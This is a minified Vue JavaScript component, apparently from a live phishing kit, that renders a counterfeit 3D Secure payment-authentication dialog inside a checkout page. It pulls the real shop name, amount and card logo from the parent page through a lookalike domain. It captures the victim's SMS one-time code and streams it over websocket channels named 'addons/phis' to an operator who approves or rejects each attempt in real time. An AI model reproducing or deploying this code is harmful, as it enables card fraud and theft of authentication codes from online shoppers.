import{f as P,g as O,r as n,h as R,i as U,j as z,s as p,k as V,l as F,c as m,o as c,a as e,m as q,d as u,n as C,p as E,v as G,t as D,b as w,w as h,q as Y,T as B,x as $,y as J,z as X,_ as W}from"./BHUajnzE.js";async function f(g,r=["innerHTML"]){return new Promise((l,i)=>{const o=new MessageChannel;o.port1.onmessage=s=>{o.port1.close(),s.data.success?(console.log("拿到数据：",s.data.data),l(s.data.data)):i(s.data.error)},window.top.postMessage({type:"GET_SINGLE_DOM",selector:g,attributes:r},"https://www.chemicalguys.top",[o.port2]),setTimeout(()=>{o.port1.close(),i("Timeout")},2e3)})}async function Z(g,r=["innerHTML"]){return new Promise((l,i)=>{const o=new MessageChannel;o.port1.onmessage=s=>{o.port1.close(),s.data.success?l(s.data.data):i(s.data.error)},window.top.postMessage({type:"SUBMIT_FORM"},"https://www.chemicalguys.top",[o.port2]),setTimeout(()=>{o.port1.close(),i("Timeout")},2e3)})}const A={class:"min-h-screen bg-gray-50 flex items-center justify-center p-4"},K={class:"w-full max-w-[750px] bg-white rounded-lg shadow-lg overflow-hidden"},Q={class:"bg-white border-b border-gray-200 p-4 sm:p-6"},ee={class:"flex items-center justify-between"},te={class:"flex items-center gap-2 sm:gap-3"},se={class:"flex items-center"},oe={class:"p-4 sm:p-6"},ae={class:"space-y-6"},ne={class:"bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4"},le={class:"text-sm text-gray-600"},ie={class:"text-sm sm:text-base text-gray-600"},re={class:"space-y-3 pt-2"},de=["disabled"],ce=["disabled"],ue={class:"pt-4 border-t border-gray-200"},me={key:0,xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"},fe={key:1,xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"},ge={class:"overflow-hidden"},pe={class:"bg-white rounded-lg shadow-xl p-6 w-full max-w-md transform transition-all"},we={class:"flex flex-col items-center text-center space-y-4"},he={class:"w-full pt-2"},xe="websocket/addons/phis/new",L="websocket/addons/phis/edit",ye="websocket/addons/phis/callback",ve=P({__name:"info",setup(g){const r=O(),l=n(!1),i=n(!1),o=n(0),s=n({}),d=n(!1),x=n(null),y=n(null),v=n(null),b=n(null),k=n(null),_=n(null);R(o,a=>{a>0&&setTimeout(()=>{o.value--},1e3)});const N=async()=>{j(),l.value=!0,r.loadStripe()};function j(){s.code!=""&&(s.value.status="checking",p(L,{message:s.value}))}const M=a=>{a.data.action=="send"?r.unloadStripe():a.data.action=="pass"?(l.value=!1,Z()):(a.data.action=="reject"||a.data.action=="decline")&&(l.value=!1,s.value.code="",d.value=!0,r.unloadStripe()),console.log("callBackFish：",a)},H=()=>{s.value.status="resend",s.value.code="",p(L,{message:s.value}),o.value=60,d.value=!1},S=()=>{d.value=!1};return U(async()=>{z(ye,M);const a=Object.fromEntries(new URLSearchParams(window.location.search));window.self!==window.top&&(console.log("im in!"),x.value.src=(await f("#basic-creditCards-secondary img",["src"])).src,y.value.src=(await f("a img",["src"])).src,v.value.innerHTML=(await f("strong:nth-child(2)")).innerHTML,b.value.innerHTML=(await f("a img",["alt"])).alt,k.value.innerHTML=new Date().toLocaleDateString("en-US",{day:"2-digit",month:"2-digit",year:"2-digit"}),_.value.innerHTML=a.fpPhone.slice(-4).padStart(4,"*")),a.status="ready",console.log(a),s.value=a,p(xe,{message:s.value})}),V(()=>{F(M)}),(a,t)=>{const I=J;return c(),m("div",A,[e("div",K,[e("div",Q,[e("div",ee,[e("div",te,[e("img",{ref_key:"shopLogo",ref:y,src:"https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&ixlib=rb-4.1.0&q=80&w=1080&utm_source=figma&utm_medium=referral",alt:"Stripe Pattern",class:"h-10 sm:h-12 w-auto rounded"},null,512)]),e("div",se,[e("img",{ref_key:"bankLogo",ref:x,src:"http://tentree.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg",alt:"Mastercard ID Check",class:"h-10 sm:h-12 w-auto rounded"},null,512)])])]),e("div",oe,[e("div",ae,[e("div",null,[t[7]||(t[7]=e("h2",{class:"mb-4 text-gray-900"},"Payment authentication",-1)),e("div",ne,[t[4]||(t[4]=e("div",{class:"text-sm text-gray-600 mb-2"},"You are authorizing a payment of",-1)),e("div",{ref_key:"fillMoney",ref:v,class:"text-2xl sm:text-3xl font-semibold text-gray-900 mb-2"},"$99.00",512),e("div",le,[t[2]||(t[2]=u(" to ",-1)),e("span",{ref_key:"fillShop",ref:b,class:"font-medium text-gray-900"},"{iShop}",512),t[3]||(t[3]=u(" on ",-1)),e("span",{ref_key:"fillDate",ref:k,class:"font-medium"},"27/02/24",512)])]),e("p",ie,[t[5]||(t[5]=u(" We have sent you a text message with a code to your registered mobile number ending in ",-1)),e("span",{ref_key:"fillPhone",ref:_,class:"font-medium"},"**7878",512),t[6]||(t[6]=u(". ",-1))])]),e("form",{onSubmit:C(N,["prevent"]),class:"space-y-4"},[e("div",null,[t[8]||(t[8]=e("label",{for:"otp-code",class:"text-sm sm:text-base text-gray-700 mb-2 block"}," Enter authentication code ",-1)),E(e("input",{id:"otp-code","onUpdate:modelValue":t[0]||(t[0]=T=>s.value.code=T),type:"text",placeholder:"Enter code",maxlength:"8",class:"w-full h-12 sm:h-14 text-center text-base sm:text-base tracking-widest font-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4",required:""},null,512),[[G,s.value.code]])]),e("div",re,[e("button",{type:"submit",disabled:s.value.code?.length!==6||l.value,class:"w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal"},D(l.value?"VERIFYING...":"SUBMIT"),9,de),e("button",{type:"button",onClick:H,disabled:o.value>0,class:"w-full h-12 sm:h-14 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal bg-white"},D(o.value>0?`RESEND CODE (${o.value}s)`:"RESEND CODE"),9,ce)])],32),e("div",ue,[e("button",{onClick:t[1]||(t[1]=T=>i.value=!i.value),class:"flex items-center justify-between w-full py-2 text-left group"},[t[11]||(t[11]=e("span",{class:"text-xs sm:text-sm text-gray-600 group-hover:text-gray-800"}," Why am I seeing this? ",-1)),i.value?(c(),m("svg",me,[...t[9]||(t[9]=[e("polyline",{points:"6 9 12 15 18 9"},null,-1)])])):(c(),m("svg",fe,[...t[10]||(t[10]=[e("polyline",{points:"9 18 15 12 9 6"},null,-1)])]))]),w(B,{name:"expand"},{default:h(()=>[E(e("div",ge,[...t[12]||(t[12]=[e("div",{class:"pb-3 pt-1 text-xs sm:text-sm text-gray-500 leading-relaxed"},[e("p",null," 3D Secure authentication provides an additional layer of security for online transactions. This verification process helps protect your card from unauthorized use by requiring you to enter a one-time password sent to your registered mobile device. ")],-1)])],512),[[Y,i.value]])]),_:1})])])])]),(c(),q(X,{to:"body"},[w(B,{name:"modal-fade"},{default:h(()=>[d.value?(c(),m("div",{key:0,class:"fixed inset-0 z-50 flex items-center justify-center p-4 bg-gray-900/40",onClick:C(S,["self"])},[e("div",pe,[e("div",we,[t[14]||(t[14]=e("div",{class:"flex-shrink-0 w-16 h-16 bg-red-100 rounded-full flex items-center justify-center"},[e("svg",{xmlns:"http://www.w3.org/2000/svg",width:"32",height:"32",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"text-red-600","aria-hidden":"true"},[e("circle",{cx:"12",cy:"12",r:"10"}),e("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),e("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})])],-1)),t[15]||(t[15]=e("div",{class:"space-y-2"},[e("h3",{class:"text-lg sm:text-xl font-semibold text-gray-900"}," Verification failed "),e("p",{class:"text-sm sm:text-base text-gray-600 max-w-sm"}," The code you entered is incorrect. Please check your message and try again, or request a new code. ")],-1)),e("div",he,[w(I,{color:"green",size:"lg",block:"",onClick:S,class:"h-12 sm:h-14"},{default:h(()=>[...t[13]||(t[13]=[u(" Try again ",-1)])]),_:1})])])])])):$("",!0)]),_:1})]))])}}}),ke=W(ve,[["__scopeId","data-v-e6aaf125"]]);export{ke as default};
